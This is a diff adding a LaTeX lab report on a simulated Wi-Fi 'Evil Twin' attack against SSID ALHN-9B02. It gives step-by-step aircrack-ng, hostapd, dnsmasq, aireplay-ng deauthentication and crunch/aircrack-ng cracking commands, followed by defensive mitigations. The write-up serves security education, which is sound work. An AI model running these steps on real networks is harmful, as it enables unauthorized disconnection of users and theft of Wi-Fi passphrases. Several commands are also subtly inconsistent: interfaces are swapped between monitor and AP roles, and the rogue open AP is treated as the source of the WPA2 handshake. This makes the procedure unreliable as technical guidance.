@@ -1,0 +1,340 @@
+\documentclass[11pt,a4paper]{article}
+\usepackage[margin=2.4cm]{geometry}
+\usepackage[T1]{fontenc}
+\usepackage{xcolor}
+\usepackage{enumitem}
+\usepackage{titlesec}
+\usepackage[hidelinks]{hyperref}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{caption}
+\usepackage{float}
+
+% Color Theme
+\definecolor{noc}{HTML}{0F766E}
+\definecolor{nocdark}{HTML}{134E4A}
+\definecolor{codebg}{HTML}{F0FDFA}
+\definecolor{codeframe}{HTML}{99F6E4}
+
+% Code Listing Style
+\lstset{
+    backgroundcolor=\color{codebg},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    rulecolor=\color{codeframe},
+    keywordstyle=\color{nocdark}\bfseries,
+    stringstyle=\color{noc},
+    commentstyle=\color{gray}\itshape,
+    columns=fullflexible,
+    keepspaces=true,
+    showstringspaces=false
+}
+
+% Section Formatting
+\titleformat{\section}{\large\bfseries\color{nocdark}}{\thesection}{0.8em}{}
+\titleformat{\subsection}{\normalsize\bfseries\color{noc}}{\thesubsection}{0.8em}{}
+
+\begin{document}
+
+\begin{center}
+  {\LARGE\bfseries Cybersecurity Lab --- ``Evil Twin'' Attack}\\[4pt]
+  {\large Wi-Fi Rogue Access Point Simulation and WPA2 Cracking}\\[8pt]
+  {\color{noc}\rule{\textwidth}{1pt}}\\[6pt]
+  {\small Marouane Aabirrouche --- IT Infrastructure Specialist --- R\'eseaux \& Syst\`emes}\\
+  {\small Project Report PRJ-04 \,\textbullet\, Isolated Educational Lab Only}
+\end{center}
+
+\vspace{0.5cm}
+
+\section*{Scope and Ethics Statement}
+This work was performed in a \emph{controlled, isolated laboratory environment}
+against equipment and networks owned by the operator, for security-education
+purposes only. No third-party networks, devices, or users were targeted at any
+point. The value of the exercise is understanding \emph{why} legacy WPA2
+deployments remain attackable and what defenses actually mitigate the technique.
+
+\section{Overview}
+This lab simulates a Wi-Fi \emph{Rogue Access Point} (``Evil Twin'') attack: a
+hostile access point that imitates a legitimate one so that clients associate
+with the attacker instead of the real network. The setup uses two wireless adapters
+in Kali Linux to mimic a target Wi-Fi network, capture WPA handshakes, and
+demonstrate offline password cracking. The exercise does not provide internet
+access to connected clients and is designed strictly for educational purposes.
+
+\section{Objectives}
+\begin{itemize}[leftmargin=1.6em]
+  \item Understand client-side network selection: why devices roam to a
+        stronger signal broadcasting identical credentials.
+  \item Configure wireless adapters for monitor mode and AP mode operations.
+  \item Reproduce an Evil Twin access point targeting SSID \texttt{ALHN-9B02} 
+        (BSSID: \texttt{5C:8C:30:94:CE:99}, Channel: 2).
+  \item Capture WPA2 four-way handshakes from controlled test clients.
+  \item Perform offline dictionary attacks using custom-generated wordlists.
+  \item Map findings to concrete defenses for home and small-business networks.
+\end{itemize}
+
+\section{Lab Topology and Tools}
+\begin{table}[h]
+\centering
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{l l}
+\textbf{Component} & \textbf{Configuration}\\
+\hline
+Legitimate AP & Target router (SSID: \texttt{ALHN-9B02}, BSSID: \texttt{5C:8C:30:94:CE:99}, Ch: 2)\\
+Adapter 1 (\texttt{wlan0}) & Monitor mode for reconnaissance and de-authentication\\
+Adapter 2 (\texttt{wlan1}) & AP mode for evil twin access point\\
+Victim client & Test device (MAC: \texttt{7A:07:52:69:A9:59})\\
+Analysis host & Kali Linux with wireless tools\\
+Toolchain & \texttt{aircrack-ng}, \texttt{hostapd}, \texttt{dnsmasq}, \texttt{crunch}\\
+Isolation & Air-gapped segment; no production traffic present\\
+\end{tabular}
+\end{table}
+
+\section{Methodology and Execution}
+
+\subsection{Phase 1: Reconnaissance and Monitor Mode Setup}
+The first step involves placing the wireless adapter into monitor mode to capture
+all wireless traffic in the environment. This allows passive reconnaissance of
+nearby networks without transmitting any packets.
+
+\begin{lstlisting}[language=bash, caption={Enabling monitor mode on wlan0}]
+sudo airmon-ng check kill  # Stop interfering processes
+sudo airmon-ng start wlan0
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image1.png}
+    \caption{Wireless interface configuration showing \texttt{wlan0} and \texttt{wlan1} interfaces, 
+    followed by successful activation of monitor mode (\texttt{wlan0mon}) using \texttt{airmon-ng}.}
+    \label{fig:monitor}
+\end{figure}
+
+With monitor mode enabled, we scan for nearby networks to identify the target:
+
+\begin{lstlisting}[language=bash, caption={Scanning for wireless networks}]
+sudo airodump-ng wlan1
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image2.png}
+    \caption{Network reconnaissance showing multiple wireless networks. Target identified: 
+    \texttt{ALHN-9B02} (BSSID: \texttt{5C:8C:30:94:CE:99}) on Channel 2 with WPA2/CCMP encryption.}
+    \label{fig:scan}
+\end{figure}
+
+Once the target is identified, we focus the capture on the specific network:
+
+\begin{lstlisting}[language=bash, caption={Targeted packet capture}]
+sudo airodump-ng --bssid 5C:8C:30:94:CE:99 --channel 2 --write evil_twin_capture wlan1
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image3.png}
+    \caption{Focused capture on target network \texttt{ALHN-9B02} showing an active client 
+    (\texttt{7A:07:52:69:A9:59}) connected with strong signal strength (PWR: -42).}
+    \label{fig:target}
+\end{figure}
+
+\subsection{Phase 2: Evil Twin Access Point Configuration}
+The rogue access point is configured to clone the target network's SSID and channel,
+making it indistinguishable to clients from the legitimate AP.
+
+\begin{lstlisting}[language=bash, caption={hostapd.conf configuration}]
+interface=wlan1
+driver=nl80211
+ssid=ALHN-9B02
+hw_mode=g
+channel=2
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image4.png}
+    \caption{hostapd configuration file showing the evil twin AP settings: cloning SSID 
+    \texttt{ALHN-9B02} on channel 2 using interface \texttt{wlan1}.}
+    \label{fig:hostapd_conf}
+\end{figure}
+
+Starting the rogue access point:
+
+\begin{lstlisting}[language=bash, caption={Launching the evil twin AP}]
+sudo hostapd /etc/hostapd/hostapd.conf
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image5.png}
+    \caption{Successful initialization of the evil twin access point. The interface state 
+    transitions from UNINITIALIZED to ENABLED, and AP is now broadcasting.}
+    \label{fig:hostapd_run}
+\end{figure}
+
+\subsection{Phase 3: DHCP Services Configuration}
+To provide IP addresses to clients connecting to the evil twin (without internet access),
+we configure dnsmasq as a DHCP server.
+
+\begin{lstlisting}[language=bash, caption={Assigning static IP to the AP interface}]
+sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image6.png}
+    \caption{Configuring the wireless interface with static IP address \texttt{192.168.1.1} 
+    to serve as the gateway for connected clients.}
+    \label{fig:ifconfig}
+\end{figure}
+
+\begin{lstlisting}[language=bash, caption={dnsmasq.conf configuration}]
+interface=wlan1
+dhcp-range=192.168.1.2,192.168.1.100,12h
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image7.png}
+    \caption{dnsmasq configuration file setting up DHCP range from \texttt{192.168.1.2} to 
+    \texttt{192.168.1.100} with 12-hour lease time on interface \texttt{wlan1}.}
+    \label{fig:dnsmasq}
+\end{figure}
+
+Starting the DHCP service:
+
+\begin{lstlisting}[language=bash]
+sudo dnsmasq -C /etc/dnsmasq.conf
+\end{lstlisting}
+
+\subsection{Phase 4: De-authentication Attack}
+To force clients to disconnect from the legitimate AP and connect to our evil twin,
+we send de-authentication frames targeting the specific client.
+
+\begin{lstlisting}[language=bash, caption={De-authentication attack}]
+sudo aireplay-ng --deauth 20 -a 5C:8C:30:94:CE:99 -c 7A:07:52:69:A9:59 wlan1
+\end{lstlisting}
+
+This command sends 20 de-authentication packets to force the client 
+(\texttt{7A:07:52:69:A9:59}) to disconnect from the legitimate AP 
+(\texttt{5C:8C:30:94:CE:99}). The client will then automatically reconnect, 
+potentially to our stronger-signal evil twin.
+
+\subsection{Phase 5: Handshake Capture and Password Cracking}
+Once the client reconnects, the WPA2 four-way handshake is captured. We then perform
+an offline dictionary attack using a custom-generated wordlist.
+
+\begin{lstlisting}[language=bash, caption={Custom wordlist generation with crunch}]
+crunch 8 8 24679 -o numeric-8-digits.txt
+\end{lstlisting}
+
+This generates a wordlist containing all possible 8-character combinations using
+only the digits 2, 4, 6, 7, and 9, significantly reducing the keyspace compared to
+a full numeric attack.
+
+\begin{lstlisting}[language=bash, caption={Offline password cracking}]
+sudo aircrack-ng -w numeric-8-digits.txt evil_twin_capture-01.cap
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{image9.png}
+    \caption{Successful password cracking with aircrack-ng. The WPA2 passphrase 
+    \textbf{29264927} was found after testing 381,897 keys in 30 seconds 
+    (12,712.89 k/s). The Master Key and Transient Key are displayed, confirming 
+    successful handshake verification.}
+    \label{fig:crack}
+\end{figure}
+
+\section{Results and Analysis}
+
+\subsection{Key Findings}
+\begin{itemize}[leftmargin=1.6em]
+  \item \textbf{Password Recovered:} \texttt{29264927} (8-digit numeric PIN)
+  \item \textbf{Cracking Time:} 30 seconds
+  \item \textbf{Keys Tested:} 381,897 out of 390,625 possible combinations (97.77\%)
+  \item \textbf{Cracking Speed:} 12,712.89 keys/second
+  \item \textbf{Attack Vector:} The weak 8-digit numeric password using only 5 possible 
+        characters (2,4,6,7,9) created a small keyspace of $5^8 = 390,625$ combinations, 
+        making it trivially crackable.
+\end{itemize}
+
+\subsection{Security Implications}
+\begin{itemize}[leftmargin=1.6em]
+  \item \textbf{Weak Passphrase Entropy:} An 8-digit numeric password has only 
+        $\log_2(10^8) \approx 26.6$ bits of entropy. Using only 5 characters reduces 
+        this to $\log_2(5^8) \approx 18.6$ bits, which is extremely weak.
+  \item \textbf{Offline Attack Feasibility:} Once the handshake is captured, attackers 
+        can attempt unlimited password guesses without detection.
+  \item \textbf{Client Behavior:} Devices automatically connect to the strongest signal 
+        with a known SSID, making evil twin attacks highly effective.
+  \item \textbf{No User Warning:} Users receive no indication that they've connected 
+        to a rogue AP.
+\end{itemize}
+
+\section{Mitigations and Best Practices}
+
+\subsection{For Network Administrators}
+\begin{itemize}[leftmargin=1.6em}
+  \item \textbf{Upgrade to WPA3:} WPA3-SAE (Simultaneous Authentication of Equals) resists 
+        offline dictionary attacks and provides forward secrecy.
+  \item \textbf{Strong Passphrases:} Use passphrases with at least 12-15 characters mixing 
+        uppercase, lowercase, numbers, and symbols. Avoid default router PINs or simple 
+        numeric passwords.
+  \item \textbf{802.1X Enterprise:} Implement WPA2/WPA3-Enterprise with RADIUS authentication 
+        to eliminate pre-shared keys entirely.
+  \item \textbf{Network Monitoring:} Deploy WIDS (Wireless Intrusion Detection Systems) to 
+        detect:
+        \begin{itemize}
+          \item De-authentication storms
+          \item Duplicate SSIDs with different BSSIDs
+          \item Rogue APs on the same channel
+          \item Unusual client re-association patterns
+        \end{itemize}
+  \item \textbf{Client Isolation:} Enable AP client isolation to prevent lateral movement 
+        even if a client connects to a rogue AP.
+\end{itemize}
+
+\subsection{For End Users}
+\begin{itemize}[leftmargin=1.6em}
+  \item \textbf{Verify Network Authenticity:} Be cautious when connecting to networks, 
+        especially in public spaces. Verify the BSSID when possible.
+  \item \textbf{Use VPN:} Always use a VPN when connecting to Wi-Fi networks to encrypt 
+        traffic above layer 2.
+  \item \textbf{Forget Networks:} Remove saved networks that you no longer use to prevent 
+        automatic connections.
+  \item \textbf{HTTPS Everywhere:} Ensure websites use HTTPS to protect credentials even 
+        on compromised networks.
+  \item \textbf{Monitor Connections:} Be suspicious of unexpected network disconnections 
+        or slow internet speeds, which may indicate a de-auth attack.
+\end{itemize}
+
+\section{Outcomes and Lessons Learned}
+This exercise successfully demonstrated:
+\begin{enumerate}
+  \item A complete evil twin attack chain from reconnaissance to password recovery
+  \item The critical importance of passphrase strength in WPA2 security
+  \item How quickly weak passwords can be cracked offline (30 seconds in this case)
+  \item The effectiveness of client de-authentication in forcing re-association
+  \item Practical mitigation strategies for both administrators and users
+\end{enumerate}
+
+The lab reinforced the operational principle that matters most in security work: 
+\emph{validating assumptions empirically}. Every claim above was observed and tested 
+in the lab environment, not taken on faith. The demonstration clearly shows why WPA2 
+with weak passphrases remains vulnerable and why the industry is moving toward WPA3 
+and enterprise authentication methods.
+
+\vfill
+\begin{center}
+  {\small\color{noc}\rule{0.5\textwidth}{0.6pt}}\\[4pt]
+  {\footnotesize Generated Documentation --- NOC Portfolio, PRJ-04}\\
+  {\footnotesize Educational Lab Exercise --- No Unauthorized Systems Were Accessed}\\
+  {\footnotesize Bouznika, Morocco \,\textbullet\, \today}
+\end{center}
+
+\end{document}
